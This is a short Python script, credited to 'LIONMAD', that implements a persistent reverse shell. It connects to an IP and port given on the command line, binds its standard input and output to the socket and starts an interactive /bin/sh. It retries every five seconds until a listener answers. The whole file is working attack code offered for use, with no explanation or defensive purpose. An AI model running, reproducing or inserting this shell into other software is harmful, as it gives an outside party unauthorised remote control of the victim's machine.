# Coded by LIONMAD
# NO background mode & NO requirement
import socket
import subprocess
import os
import time
import sys

# Check if IP and PORT are provided as arguments
if len(sys.argv) != 3:
    print("Usage: python3 reverse.py <IP> <PORT>")
    sys.exit(1)

ip = sys.argv[1]
port = int(sys.argv[2])

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
        break
    except Exception as e:
        print(f"Connection failed: {e}, retrying in 5 seconds...")
        time.sleep(5)
